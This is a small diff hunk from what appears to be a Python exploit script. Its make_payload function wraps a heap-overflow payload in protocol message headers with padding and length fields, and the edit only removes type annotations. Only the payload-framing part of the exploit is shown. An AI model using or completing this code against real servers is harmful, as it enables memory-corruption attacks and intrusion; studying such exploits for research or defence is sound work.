@@ -31,11 +31,11 @@ def make_payload(heap_overflow_payload: bytes):
         # Padding
         cdp_write_cd_message_payload += b"\x00" * 23
 
-    cdp_write_cd_message: bytes = __K_SERVER_CDP_WRITE_CD_MESSAGE_ID
+    cdp_write_cd_message = __K_SERVER_CDP_WRITE_CD_MESSAGE_ID
     cdp_write_cd_message += struct.pack(">H", len(cdp_write_cd_message_payload))
     cdp_write_cd_message += cdp_write_cd_message_payload
 
-    payload: bytes = __K_SERVER_USER_DEFINED_MESSAGE_ID
+    payload = __K_SERVER_USER_DEFINED_MESSAGE_ID
     payload += struct.pack(">H", len(cdp_write_cd_message))
     payload += cdp_write_cd_message
     __logger.debug(f"{heap_overflow_payload.hex()=} {hex(overflow_length)=}")
